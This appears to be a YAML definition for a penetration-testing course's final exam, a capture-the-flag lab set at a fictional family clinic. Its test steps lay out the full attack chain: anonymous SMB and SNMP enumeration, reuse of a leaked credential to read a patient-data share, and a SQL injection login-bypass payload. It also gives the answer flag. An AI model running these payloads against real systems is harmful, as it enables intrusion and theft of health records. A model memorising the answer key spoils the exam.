category: assessment
credentials: []
description: The final exam for the course. A small healthcare clinic has asked you
  to assess two internet-facing systems left over from a prior IT contractor. Three
  tokens are planted across the in-scope systems; recover all three and submit the
  assembled flag. No workbook. No hints. 120 minutes.
difficulty: advanced
duration_minutes: 120
flag: OCR{p1n3cr3st_l34k_0wn3d}
hints: []
name: Pinecrest Family Practice - Final Exam
objectives:
- Discover all in-scope hosts on the clinic subnet and identify exposed services
- Recover the three planted tokens (labeled Token 1, Token 2, and Token 3) from the
  in-scope systems
- Assemble the tokens into the OCR{token1_token2_token3} flag and submit it within
  the 120 minute window
randomize_ip_offsets: true
scenario: 'Pinecrest Family Practice is a six-provider primary care clinic in

  Charlotte, North Carolina. Three months ago they parted ways with

  their outsourced IT contractor and have been running on minimal

  support since. Pinecrest has retained your firm to identify any

  exposed systems still reachable from outside the clinic network.


  The flag from this challenge is the code to access the Canvas

  quiz. Enter the flag here and then use the flag to enter the quiz.


  Briefing from the practice manager, Renee Patel: "After our IT vendor

  left, we found two servers in the network closet that nobody at our

  clinic remembers signing off on. One looks like a file server. The

  other appears to host an old internal scheduling tool the staff used

  before we switched to MyChart. We need to know what is exposed,

  what data is at risk, and whether anyone could log in to either system

  from outside our network."


  Three tokens are planted across the engagement. Assemble them in order

  into the OCR{token1_token2_token3} format and submit a single flag.

  No hints, no walkthrough, no instructor guidance during the exam.

  '
test:
  steps:
  - command: nmap -p 445 --open {target.clinic-fs} 2>&1 | grep -c '445.*open'
    expect: '1'
    name: SMB port responds
    timeout: 15
  - command: snmpwalk -v2c -c public {target.clinic-fs} 1.3.6.1.2.1.1.4.0 2>&1 | grep
      -o 'Token 1 = p1n3cr3st'
    expect: Token 1 = p1n3cr3st
    name: Token 1 retrievable from SNMP sysContact
    timeout: 20
  - command: smbclient -L //{target.clinic-fs} -N 2>&1 | grep -c 'clinic-shared'
    expect: '1'
    name: Anonymous SMB lists clinic-shared
    timeout: 15
  - command: smbclient //{target.clinic-fs}/clinic-shared -N -c 'get IT_Notes_2025.txt
      /tmp/clinic_notes.txt' 2>&1 && grep -o 'Arch1ve_P1n3_2024#' /tmp/clinic_notes.txt
    expect: Arch1ve_P1n3_2024#
    name: Notes doc leaks clinic_archivist credentials
    timeout: 15
  - command: smbclient //{target.clinic-fs}/phi-archive -U clinic_archivist%Arch1ve_P1n3_2024#
      -c 'get phi_breach_summary.txt /tmp/clinic_phi.txt' 2>&1 && grep -o 'Token 2
      = l34k' /tmp/clinic_phi.txt
    expect: Token 2 = l34k
    name: Token 2 retrievable from phi-archive with creds
    timeout: 15
  - command: curl -s -o /dev/null -w '%{http_code}' http://{target.clinic-portal}/
    expect: '200'
    name: Portal homepage responds
    timeout: 15
  - command: curl -s http://{target.clinic-portal}/robots.txt | grep -c '/staff/'
    expect: '1'
    name: Robots.txt discloses staff path
    timeout: 15
  - command: curl -s -c /tmp/clinic_jar -b /tmp/clinic_jar -L -d "username=admin&password=anything'
      OR '1'='1" http://{target.clinic-portal}/staff/login | grep -o 'Token 3 = 0wn3d'
    expect: Token 3 = 0wn3d
    name: SQLi bypass on staff portal yields token 3
    timeout: 20
  - command: echo 'OCR{p1n3cr3st_l34k_0wn3d}'
    expect: OCR{p1n3cr3st_l34k_0wn3d}
    name: Verify assembled flag
topology:
  edges:
  - access: direct
    from: attacker
    label: SMB:445 / SNMP:161
    to: clinic-fs
  - access: direct
    from: attacker
    label: HTTP:80
    to: clinic-portal
  nodes:
  - id: clinic-fs
    ip_offset: '10'
    label: Clinic File Server
    ports:
    - 139
    - 445
    - 161
    services:
    - Samba
    - SNMP
    type: server
    x: 1
    y: 1
  - id: clinic-portal
    ip_offset: '11'
    label: Clinic Staff Portal
    ports:
    - 80
    services:
    - Flask
    type: server
    x: 3
    y: 1
visibility: course
week: 16
workbook: wiki/course/pentest/CH_COURSE01_Weekly_Challenges/16_Pinecrest_Family_Practice_Final_Exam/
